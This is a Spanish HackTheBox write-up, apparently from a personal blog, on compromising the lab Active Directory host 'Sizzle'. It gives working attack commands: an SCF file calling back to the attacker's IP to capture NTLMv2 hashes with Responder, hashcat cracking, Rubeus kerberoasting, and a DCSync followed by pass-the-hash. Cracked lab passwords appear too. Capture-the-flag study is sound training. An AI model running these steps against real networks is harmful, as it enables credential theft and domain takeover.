---
layout: post
toc: true
title: "Sizzle - HackTheBox Writeup"
categories: HackTheBox
tags: [CTF, Active Directory, Windows]
author:
  - H4RRIZN
---

![logo](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/37ba34f53af9833615d1a9af6988044e39784fa5/_includes/CTFIMG/Sizzle/Logo.png)

## Reconocimiento inicial

Para comenzar realizaremos un scan con nmap para detectar los puertos abiertos en el host victima:

```bash
nmap -sS --min-rate 1500 -p- --open -n -Pn -vv 10.10.10.103
```

![Recon1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Recon1.png)

Tenemos una buena cantidad de puertos abiertos. Realizamos otro scan para detectar las versión sobre los servicios detectados. En este caso ignorare los puertos más altos con servicio **unknown**

```bash
nmap -sCV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001 10.10.10.103 -oN port_scan
```

![Recon2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Recon2.png)

![Recon3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Recon3.png)

De las capturamos podemos ver:

- Podemos iniciar sin credenciales al servidor ftp
- Servidor IIS 10.0 en puertos 80 y 443
- El servicio winrm está habilitado para conectarse con y sin ssl

Desde este punto comenzare enumerando el servidor ftp.

## Recon - FTP

Nos conectamos como usuario Anonymous sin credenciales:

![ftp1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/ftp1.png)

Al listar los recursos no tenemos resultados, y al intentar depositar un fichero se nos denegara el acceso:

![ftp2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/ftp2.png)

Con esto en mente y sin mucha información enumerare el servidor web:

## Recon - Web

Al ingresar por http solo se muestra un gif de bacon a la plancha:

![web1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Web1.png)

Mediante https vemos lo mismo:

![web2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Web2.png)

### Fuzzing

Como no tenemos más que un bacon realizare fuzzing sobre los puertos encontrados comenzando por http. Utilizare la herramienta dirsearch para realizar esto:

```bash
dirsearch -u http://10.10.10.103/ -x 404,403 -t 100
```

![fuzz1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Fuzz1.png)

Hemos encontrado un directorio relevante llamado **[certsrv](https://learn.microsoft.com/es-es/system-center/scom/obtain-certificate-windows-server-and-operations-manager?view=sc-om-2022&tabs=Enterp%2CEnter)** el cual corresponde a AD el cual se utiliza para obtener certificados para utilizar con servidores Windows. Lamentablemente al ingresar a esta ruta notamos que se nos solicitan credenciales:

![fuzz2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/Fuzz2.png)

Si ingresamos mediante https tendremos el mismo resultado, por lo que no realizare fuzzing sobre este puerto ya que es probable que encuentre las mismas rutas.

## Recon - SMB

Como no tenemos credenciales comenzaremos listando los recursos compartidos en smb con una Null Session:

![smb1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb1.png)

Podemos ver que tenemos un recurso llamado **`CertEnroll`** el cual puede tener o no relación con la ruta en el servidor web. Tenemos otro recurso llamado **`Department Shares`** el cual no tiene comentarios al igual que el recurso **`Operations`**.

### CertEnroll

Al conectarnos al recurso de **CertEnroll** con una Null Session se nos deniega el acceso:

![smb2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb2.png)

### Operations

Al ingresar en Operations podemos ver lo mismo:

![smb3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb3.png)

### Department Shares

Al conectarnos con una Null Session a **Department Shares** notamos que tenemos 20 directorios.

![smb4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb4.png)

Para agilizar la tarea de inspección de estos directorios realizare una montura en mi maquina de atacante para traer estos directorios:

```bash
mkdir /mnt/department
mount -t cifs -o username=h4rri,password=''  '//10.10.10.103/Department Shares' /mnt/department
```

Al ingresar en /mnt/department podemos ver los directorios del recurso smb:

![smb5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb5.png)

Al inspeccionarlos con **`tree`** notamos que el directorio **`Users`** contiene carpetas con nombres de usuarios los cuales utilizare posteriormente para validarlos. Además de el directorio **`ZZ_ARCHIVE`** el cual contiene ficheros de distintos tipos. 

```bash
.
├── Accounting
├── Audit
├── Banking
│   └── Offshore
│       ├── Clients
│       ├── Data
│       ├── Dev
│       ├── Plans
│       └── Sites
< SNIP >
├── Users
│   ├── Public
│   ├── amanda
│   ├── amanda_adm
│   ├── bill
│   ├── bob
│   ├── chris
│   ├── henry
│   ├── joe
│   ├── jose
│   ├── lkys37en
│   ├── morgan
│   └── mrb3n
└── ZZ_ARCHIVE
    ├── AddComplete.pptx
    ├── AddMerge.ram
    ├── ConfirmUnprotect.doc
    ├── ConvertFromInvoke.mov
    ├── ConvertJoin.docx
    ├── CopyPublish.ogg
    ├── DebugMove.mpg
    ├── DebugSelect.mpg
    ├── DebugUse.pptx
    ├── DisconnectApprove.ogg
    ├── DisconnectDebug.mpeg2
    ├── EditCompress.xls
```

Al inspeccionar el contenido de los ficheros con **`strings`** notamos que no contienen nada y al utilizar **`xxd`** notamos que están llenos de null bytes:

![smb6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb6.png)

```bash
cat *.ppt | xxd

0005e700: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0005e710: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0005e720: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0005e730: 0000 0000 0000 0000 0000 0000 0000 0000  ................
<SNIP>
```

### → Enumeración de usuarios validos

Ya que tenemos una recurso que contiene carpetas con nombres de usuarios crearemos una lista para poder enumerar usuarios validos en el AD. Para esto utilizare kerbrute:

```bash
kerbrute userenum -d htb.local --dc 10.10.10.103 users
```

![smb7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb7.png)

Como podemos ver amanda es un usuario valido. Al intentar depositar un fichero en el directorio de amanda se nos denegará la acción:

![smb8](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/smb8.png)

A continuación enumerare los directorios en los cuales podría almacenar un fichero malicioso con el fin de que amanda u otro usuario conectado lo solicite para poder conseguir [robar el hash NTLMv2](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).

### SFC File Attack

Para automatizar este proceso utilizare el siguiente script con el fin de recorrer la lista de usuarios como directorios depositando el fichero test.txt hasta encontrar un directorio en el cual se nos permita depositar un fichero:

```bash
for user in $(cat users); do 
    directory="$user"
    if smbclient -D "\Users" -N -c "cd $directory; put test.txt; dir" "\\\\10.10.10.103\\Department Shares" > /dev/null 2>&1; then 
        if smbclient -D "\Users" -N -c "cd $directory; dir" "\\\\10.10.10.103\\Department Shares" 2>/dev/null | grep -q "test.txt"; then
            echo "El archivo fue depositado en el directorio $directory y tiene permisos de escritura."; 
        fi
    fi
done
```

![sfc1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc1.png)

Como se aprecia tenemos permisos de escritura sobre el directorio del usuario Public. Además luego de vigilar el fichero podemos notar que está siendo eliminado:

![sfc2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc2.png)

En base a esto creare un fichero SFC (Shell Command Files):

```bash
[Shell]
Command=2
IconFile=\\10.10.14.27\evil.ico
[Taskbar]
Command=ToggleDesktop
```

Como se ve se esta solicitando un fichero llamado evil.ico desde nuestra dirección IP asignada. Con esto, antes de depositarlo en **`/Users/Public`** iniciaremos responder para capturar el hash NTLMv2:

```bash
responder -I tun0
```

Depositamos el fichero:

![sfc3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc3.png)

Y al esperar un poco podemos ver que hemos recibido el hash de amanda:

![sfc4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc4.png)

Depositaremos el hash en un fichero para crackearlo, en este caso utilizare hashcat para hacerlo:

```bash
hashcat -m 5600 amanda_hash /usr/share/wordlists/rockyou.txt 
```

![sfc5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc5.png)

Podemos observar que el resultado nos muestra la contraseña **`Ashare1972`**. Podemos comprobar que estas credenciales son validas utilizando crackmapexec:

![sfc6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc6.png)

Y son validas contra smb, pero al probarlas contra winrm tenemos un error. Como vimos anteriormente con smbclient no pudimos acceder a los recursos **`CertEnroll`** y **`Operations`**. Así que ingresare nuevamente a estos recursos con las credenciales obtenidas:

![sfc7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc7.png)

De momento para **`CertEnroll`** no veo nada interesante con lo que poder aprovecharme. Para el recurso de **`Operations`** vemos lo mismo:

![sfc8](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc8.png)

 Si recordamos en el servidor web tenemos un panel de autenticación ubicado en **`https://10.10.10.103/certsrv`**:

![sfc9](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc9.png)

Al ingresar podemos notar que estamos ante Microsoft Active Directory Certificate Services:

![sfc10](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sfc10.png)

## Shell as amanda

Anteriormente no pudimos conectarnos con las credenciales de amanda contra el servicio de winrm. Podemos generar un certificado para poder conectarnos con **`evil-winrm`** utilizando un certificado y una llave contra el puerto **`5986`** el cual corresponde al servicio winrm a través de SSL. Tenemos que generar una llave (fichero **`.key`**) y un fichero **`.csr`** el cual utilizaremos para generar el certificado:

```bash
openssl req -newkey rsa:2048 -nodes -keyout file.key -out file.csr
```

![sh1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh1.png)

![sh2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh2.png)

A continuación en la web presionamos en **Request a certificate**:

![sh3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh3.png)

Ahora presionamos sobre **advanced certificate request**:

![sh4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh4.png)

A continuación copiaremos el contenido del fichero **`file.csr`** en el sitio web:

![sh5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh5.png)

![sh6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh6.png)

Finalmente descargaremos el certificado en formato **`Base64 encoded`**. Finalmente utilizaremos el certificado y la llave para conectarnos con **`evil-winrm`**:

![sh7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sh7.png)

Al enumerar nuestros privilegios y pertenencias a grupos no vemos nada interesante:

![sh8](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/sg8.png)

Además la flag tampoco se encuentra en el directorio de nuestro usuario.

### Enum - Bloodhound

Utilizare bloodhound-python para extraer la información de manera local para posteriormente cargarla en Bloodhound:

![bh1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/bh1.png)

Una vez iniciado Bloodhound cargaremos el fichero **`.zip`** resultante de bloodhound-python, posteriormente marcaremos al usuario amanda como Owned presionando click derecho sobre el nodo y seleccionando **`Mark User as Owned`**:

![bh2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/bh2.png)

Al presionar en la pestaña de **`Analysis`** podemos buscar por usuarios vulnerables a kerberoasting con el cual podamos obtener un ticket TGS:

![bh3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/bh3.png)

Vemos que el usuario **`mrlky`** es vulnerable a kerberoasting. Antes de abusar de esto enumerare la forma más rápida de convertirse en Domain Admin:

![bh4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/bh4.png)

Como vemos el usuario **`mrlky`** tiene la capacidad de realizar un ataque DCSync sobre **`HTB.LOCAL`**. En base a esto comenzare por abusar del kerberoasting sobre este usuario para posteriormente realizar un DCSync con el objetivo de obtener el hash del usuario Administrator.

## Privesc

Comenzamos por solicitar el ticket TGS del usuario mrlky, para este caso utilizare Rubeus ya que al utilizar **`GetUserSPNs`** no tengo resultados positivos. Cargare Rubeus con evil-winrm en la carpeta de Temp:

![priv1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/priv1.png)

Observamos que tenemos una restricción y no podemos utilizar evil-winrm para subir ficheros, además de que no podemos listar el contenido de la carpeta Temp, listare la politica de AppLocker para listar alguna ruta en la que podamos descargar contenido.

```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

![priv2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/priv2.png)

Como se ve podemos realizar la ejecución de programas en la carpeta de Windows. Para esto creare una carpeta dentro de la misma carpeta Temp y depositare Rubeus en esta, Para esto montare un servidor con python para hostear el binario de Rubeus:

![priv3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/priv3.png)

### Kerberoasting - mrlky

Ahora realizaremos el ataque de kerberoasting con Rubeus sobre el usuario mrlky:

```bash
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap /user:mrlky
```

![kerb1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/kerb1.png)

Ahora depositaremos el hash en un fichero para crackearlo offline:

```bash
hashcat -m 13100 hash rockyou.txt
```

![kerb2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/kerb2.png)

Observamos el resultado de la contraseña del usuario el cual es **`Football#7`**. Ahora estamos a un paso de obtener acceso como administrador.

### DCSync

Sabemos que podemos realizar un DCSync sobre HTB.LOCAL asi que utilizare secretsdump para hacer esto de manera más eficiente:

![dc1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/dc1.png)

Ya que obtuvimos los hashes de la base de datos del directorio activo podemos utilizar la tecnica de Pass The Hash para obtener una shell como usuario Administrador. Para este caso utilizare la herramienta psexec:

![dc2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/527a59b642bb1b88e565dabbf7c02b794f539e2d/_includes/CTFIMG/Sizzle/dc2.png)

Ya con esto podemos leer las flags ubicadas en el directorio del usuario Administrator y mrlky.

Pwned! 🏴‍☠️